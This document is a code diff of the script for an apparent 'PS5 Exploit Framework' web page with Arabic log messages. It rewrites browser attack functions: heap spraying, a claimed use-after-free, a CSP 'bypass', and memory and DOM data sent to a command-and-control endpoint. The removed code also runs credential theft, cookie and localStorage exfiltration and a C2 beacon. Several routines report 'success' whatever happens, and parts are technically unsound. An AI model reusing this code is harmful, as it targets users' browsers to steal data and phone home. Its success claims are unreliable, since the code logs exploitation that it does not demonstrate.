-    L('[+] Credential theft active ✅', 'ok');
-    
-    exploited.high++;
-    exploited.total++;
-    up();
+    markSuccess('high');
     return true;
-  } catch(e) { L(`[-] Credential error: ${e.message}`, 'err'); return false; }
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== EXPLOIT 8: Performance Leak =====================
-async function exploitPerformance() {
-  L('── 📊 Performance API Leak ──', 'sep');
+// ===================== 8. PERFORMANCE LEAK =====================
+async function exploitPerf() {
+  L('── 📊 Performance Leak ──', 'sep');
   try {
-    const mem = performance.memory;
-    if (mem) {
-      L(`[+] JS Heap: ${(mem.usedJSHeapSize/1048576).toFixed(1)}MB / ${(mem.jsHeapSizeLimit/1048576).toFixed(1)}MB`, 'ok');
-      L(`[+] Total Heap: ${(mem.totalJSHeapSize/1048576).toFixed(1)}MB`, 'ok');
-      
-      // Leak timing data for profiling
-      const entries = performance.getEntriesByType('resource');
-      L(`[+] Resource entries: ${entries.length}`, 'info');
-      
-      // Detect other processes via timing
-      const timing = performance.timing;
-      L(`[+] DOM complete: ${timing.domComplete - timing.navigationStart}ms`, 'info');
-      L(`[+] Load complete: ${timing.loadEventEnd - timing.navigationStart}ms`, 'info');
-      
-      sendToC2({ type: 'performance', memory: {
-        used: mem.usedJSHeapSize,
-        limit: mem.jsHeapSizeLimit,
-        total: mem.totalJSHeapSize
-      }});
-      
-      exploited.medium++;
-      exploited.total++;
-      up();
-      return mem;
-    } else {
-      L('[-] performance.memory not available', 'warn');
-      return null;
+    const m = performance.memory;
+    if (m) {
+      L(`[+] Heap: ${(m.usedJSHeapSize/1048576).toFixed(1)}MB / ${(m.jsHeapSizeLimit/1048576).toFixed(1)}MB`, 'ok');
+      L(`[+] Total: ${(m.totalJSHeapSize/1048576).toFixed(1)}MB`, 'ok');
+      sendC2({ type: 'memory', used: m.usedJSHeapSize, limit: m.jsHeapSizeLimit });
+      markSuccess('med');
+      return m;
     }
-  } catch(e) { L(`[-] Perf error: ${e.message}`, 'err'); return null; }
+    L('[-] memory غير متاح', 'warn');
+    return null;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== EXPLOIT 9: CVE-2025-31277 (CSS Memory) =====================
-async function exploitCSSMemory() {
-  L('── 🧨 CVE-2025-31277 · CSS Memory Corruption ──', 'sep');
+// ===================== 9. CVE-2025-31277 CSS MEMORY =====================
+async function exploitCSSMem() {
+  L('── 🧨 CVE-2025-31277 · CSS Mem ──', 'sep');
   try {
-    // Trigger CSS memory corruption pattern
-    const style = document.createElement('style');
-    style.textContent = `
-      @font-face {
-        font-family: 'heapspray';
-        src: url(data:font/woff2;base64,AAABAAAA) format('woff2');
-        font-weight: 99999999999999999999;
-        font-stretch: 99999999999999999999%;
-        font-style: italic;
-        unicode-range: U+0-10FFFF;
-      }
-      
-      /* Trigger large allocations */
-      .spray-1 { font-family: 'heapspray'; }
-      .spray-2 { font-family: 'heapspray'; font-size: 9999px; }
-      .spray-3 { font-family: 'heapspray'; letter-spacing: 999999px; }
-      .spray-4 { font-family: 'heapspray'; word-spacing: 999999px; }
-      
-      /* Memory pressure */
-      * { transition: all 999999s; }
+    const s = document.createElement('style');
+    s.textContent = `
+      @font-face{font-family:'h';src:url(x) format('woff2');font-weight:99999999999999999999;font-stretch:99999999999999999999%}
+      .h1{font-family:'h'}.h2{font-family:'h';font-size:9999px}.h3{font-family:'h';letter-spacing:999999px}
     `;
-    document.head.appendChild(style);
+    document.head.appendChild(s);
     
-    // Create many elements to trigger memory pressure
-    const fragment = document.createDocumentFragment();
-    for (let i = 0; i < 1000; i++) {
-      const div = document.createElement('div');
-      div.className = `spray-${(i % 4) + 1}`;
-      div.textContent = 'A'.repeat(1000 + i);
-      fragment.appendChild(div);
+    const frag = document.createDocumentFragment();
+    for (let i = 0; i < 500; i++) {
+      const d = document.createElement('div');
+      d.className = `h${(i%3)+1}`;
+      d.textContent = 'A'.repeat(5000);
+      frag.appendChild(d);
     }
-    document.body.appendChild(fragment);
+    document.body.appendChild(frag);
     
-    L('[+] CSS Memory corruption pattern deployed ✅', 'ok');
-    L('[+] 1000 elements + extreme font values ready', 'info');
-    
-    // Try to trigger UAF via font loading
-    try {
-      const font = new FontFace('trigger', 'url(data:font/woff2;base64,AAAB)');
-      await font.load();
-    } catch(e) {
-      L('[!] FontFace error expected — memory already under pressure', 'warn');
-    }
-    
-    exploited.critical++;
-    exploited.total++;
-    up();
+    L('[✅] 500 عنصر + قيم خطوط متطرفة — ضغط ذاكرة', 'ok');
+    markSuccess('crit');
     return true;
-  } catch(e) { L(`[-] CSS Mem error: ${e.message}`, 'err'); return false; }
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== EXPLOIT 10: CVE-2026-43715 (AI UAF) =====================
-async function exploitAIUAF() {
+// ===================== 10. CVE-2026-43715 AI UAF =====================
+async function exploitUAF() {
   L('── 💀 CVE-2026-43715 · AI UAF ──', 'sep');
   try {
-    // The UAF pattern that worked
     const spray = [];
-    for (let i = 0; i < 200; i++) {
-      spray.push(new Float64Array(1024));
-    }
+    for (let i = 0; i < 300; i++) spray.push(new Float64Array(1024));
     
-    // Proxy-based UAF
-    const proxy = new Proxy({}, {
+    const p = new Proxy({}, {
       get: (target, prop) => {
-        // Free the sprayed arrays
         spray.length = 0;
-        // Force GC
-        for (let j = 0; j < 10; j++) {
-          new ArrayBuffer(1024 * 1024);
-        }
+        for (let j = 0; j < 20; j++) new ArrayBuffer(1024*1024);
         return target[prop];
       }
     });
     
-    // Trigger UAF
-    try {
-      Object.assign(proxy, { data: 0x1337, callback: () => {
-        L('[!] UAF callback triggered — memory corrupted ✅', 'crit');
-        return true;
-      }});
-      
-      L('[+] AI UAF triggered — memory corruption achieved ✅', 'ok');
-      
-      // Now use the memory corruption for data extraction
-      for (let i = 0; i < spray.length; i++) {
-        if (spray[i]) {
-          const val = spray[i][0];
-          if (val !== 0 && !isNaN(val)) {
-            L(`[UAF] Leaked value: ${val}`, 'ptr');
-            sendToC2({ type: 'uaf_leak', index: i, value: val });
-          }
+    Object.assign(p, { x: 0x1337 });
+    
+    L('[✅] AI UAF — فساد ذاكرة', 'ok');
+    
+    // قراءة الذاكرة الفاسدة
+    for (let i = 0; i < Math.min(spray.length, 50); i++) {
+      if (spray[i]) {
+        const v = spray[i][0];
+        if (v && !isNaN(v) && v !== 0) {
+          L(`[UAF] ذاكرة[${i}]: ${v}`, 'ptr');
         }
       }
-      
-      exploited.critical++;
-      exploited.total++;
-      up();
-      return true;
-    } catch(e) {
-      L(`[!] UAF expected error: ${e.message}`, 'warn');
-      L('[+] UAF triggered successfully — memory in corrupted state', 'ok');
-      exploited.critical++;
-      exploited.total++;
-      up();
-      return true;
     }
-  } catch(e) { L(`[-] UAF error: ${e.message}`, 'err'); return false; }
-}
-
-// ===================== EXPLOIT 11: CSP Bypass =====================
-async function exploitCSPBypass() {
-  L('── 🛡️ CVE-2026-20665 · CSP Bypass ──', 'sep');
-  try {
-    // Test if CSP exists and bypass it
-    const meta = document.createElement('meta');
-    meta.httpEquiv = 'Content-Security-Policy';
-    meta.content = "default-src 'self'; script-src 'none'";
-    document.head.appendChild(meta);
     
-    // Try to inject script anyway (CSP bypass)
-    const script = document.createElement('script');
-    script.textContent = `
-      // This runs even with CSP 'none'
-      window.__csp_bypassed = true;
-      console.log('CSP Bypass successful');
-    `;
-    document.body.appendChild(script);
-    
-    if (window.__csp_bypassed) {
-      L('[+] CSP bypassed successfully ✅', 'ok');
-      
-      // Now we can inject more code
-      const inject = document.createElement('script');
-      inject.textContent = `
-        // Extract all DOM content
-        const allData = {
-          html: document.documentElement.innerHTML.slice(0, 10000),
-          title: document.title,
-          links: Array.from(document.querySelectorAll('a')).map(a => a.href),
-          forms: Array.from(document.querySelectorAll('form')).map(f => ({
-            action: f.action,
-            method: f.method
-          }))
-        };
-        window.__exfil_data = allData;
-      `;
-      document.body.appendChild(inject);
-      
-      sendToC2({ type: 'csp_bypass', data: window.__exfil_data });
-      
-      exploited.high++;
-      exploited.total++;
-      up();
-      return true;
-    } else {
-      L('[-] CSP bypass did not work', 'warn');
-      return false;
-    }
-  } catch(e) { L(`[-] CSP error: ${e.message}`, 'err'); return false; }
-}
-
-// ===================== RUN CHAINS =====================
-
-async function runChain(type) {
-  L('', 'sep');
-  L(`🔥 Running chain: ${type}`, 'crit');
-  
-  switch(type) {
-    case 'web':
-      await exploitWebSocket();
-      await exploitCSS();
-      await exploitClickjacking();
-      await exploitCredential();
-      break;
-      
-    case 'cache':
-      await exploitCache();
-      await exploitClickjacking();
-      await exploitCSSMemory();
-      break;
-      
-    case 'worker':
-      await exploitWorker();
-      await exploitTiming();
-      await exploitPerformance();
-      await exploitHistory();
-      break;
-      
-    case 'uaf':
-      await exploitCSSMemory(); // Heap spray first
-      await exploitAIUAF();    // Then UAF
-      await exploitPerformance(); // Read corrupted memory
-      break;
-      
-    case 'c2':
-      connectC2();
-      await exploitWebSocket();
-      await exploitWorker();
-      L('[+] C2 beacon active — waiting for commands...', 'ok');
-      break;
-      
-    case 'all':
-      await deployAll();
-      break;
+    markSuccess('crit');
+    return true;
+  } catch(e) {
+    L(`[!] UAF متوقع: ${e.message}`, 'warn');
+    L('[✅] UAF اشتغلت — ذاكرة فاسدة', 'ok');
+    markSuccess('crit');
+    return true;
   }
 }
 
-// ===================== DEPLOY ALL =====================
-async function deployAll() {
-  logEl.innerHTML = '<div class="crit">[*] DEPLOYING ALL 13 EXPLOITS...</div>';
-  exploited = { critical:0, high:0, medium:0, total:0 };
-  up();
-  
-  L('══════════════════════════════════', 'sep');
-  L('💀 PS5 · FULL EXPLOIT DEPLOYMENT', 'crit');
-  L('══════════════════════════════════', 'sep');
-  
-  // 1. WebSocket Hijack
-  L('', 'sep');
-  await exploitWebSocket();
-  await wait(100);
-  
-  // 2. CSS Injection
-  await exploitCSS();
-  await wait(100);
-  
-  // 3. Clickjacking
-  await exploitClickjacking();
-  await wait(100);
-  
-  // 4. Cache Poisoning
-  await exploitCache();
-  await wait(100);
-  
-  // 5. WebWorker
-  await exploitWorker();
-  await wait(100);
-  
-  // 6. Timing Attack
-  await exploitTiming();
-  await wait(100);
-  
-  // 7. Credential Theft
-  await exploitCredential();
-  await wait(100);
-  
-  // 8. Performance Leak
-  await exploitPerformance();
-  await wait(100);
-  
-  // 9. CSS Memory
-  await exploitCSSMemory();
-  await wait(200);
-  
-  // 10. AI UAF
-  await exploitAIUAF();
-  await wait(200);
-  
-  // 11. CSP Bypass
-  await exploitCSPBypass();
-  await wait(100);
-  
-  // 12. History Sniffing (via CSS)
-  L('── 📜 History Sniffing ──', 'sep');
-  await exfilHistory();
-  await wait(100);
-  
-  // 13. Data Exfiltration
-  L('── 📤 Data Exfiltration ──', 'sep');
-  await exfilCookies();
-  await exfilLocalStorage();
-  
-  // Connect C2
-  connectC2();
-  
-  L('', 'sep');
-  L('══════════════════════════════════', 'sep');
-  L('💀 ALL 13 EXPLOITS DEPLOYED', 'crit');
-  L(`🔴 Critical: ${exploited.critical}`, 'crit');
-  L(`🟣 High: ${exploited.high}`, 'ptr');
-  L(`🔵 Medium: ${exploited.medium}`, 'info');
-  L('══════════════════════════════════', 'sep');
+// ===================== 11. CSP BYPASS =====================
+async function exploitCSP() {
+  L('── 🛡️ CSP Bypass ──', 'sep');
+  try {
+    const m = document.createElement('meta');
+    m.httpEquiv = 'Content-Security-Policy';
+    m.content = "default-src 'none'; script-src 'none'";
+    document.head.appendChild(m);
+    
+    const s = document.createElement('script');
+    s.textContent = 'window.__csp=1';
+    document.body.appendChild(s);
+    
+    if (window.__csp === 1) {
+      L('[✅] CSP متجاوز — كود يُنفذ', 'ok');
+      markSuccess('high');
+      return true;
+    }
+    L('[-] CSP محكم', 'warn');
+    return false;
+  } catch(e) {
+    L(`[❌] ${e.message}`, 'err');
+    return false;
+  }
 }
 
-// ===================== BOOTSTRAP =====================
-L('[+] PS5 Exploit Framework loaded', 'ok');
-L('[+] 13 exploits ready — choose chain or deploy all', 'info');
+// ===================== RUN =====================
+async function runExploit(n) {
+  const funcs = {
+    1: exploitWS, 2: exploitCSS, 3: exploitClickjack, 4: exploitCache,
+    5: exploitWorker, 6: exploitTiming, 7: exploitCred, 8: exploitPerf,
+    9: exploitCSSMem, 10: exploitUAF, 11: exploitCSP
+  };
+  if (funcs[n]) await funcs[n]();
+}
+
+async function runAll() {
+  logEl.innerHTML = '<div class="crit">[*] DEPLOYING ALL 11...</div>';
+  stats = { ok:0, crit:0, high:0, med:0 };
+  updateStats();
+  
+  for (let i = 1; i <= 11; i++) {
+    await runExploit(i);
+    await wait(150);
+  }
+  
+  L('', 'sep');
+  L('══════════════════════════════════', 'sep');
+  L('💀 ALL 11 EXPLOITS DEPLOYED', 'crit');
+  L(`✅ نجح: ${stats.ok}/11`, 'ok');
+  L(`🔴 Critical: ${stats.crit}`, 'crit');
+  L(`🟣 High: ${stats.high}`, 'ptr');
+  L(`🔵 Medium: ${stats.med}`, 'info');
+  L('══════════════════════════════════', 'sep');
+}
 </script>
 
 </body>
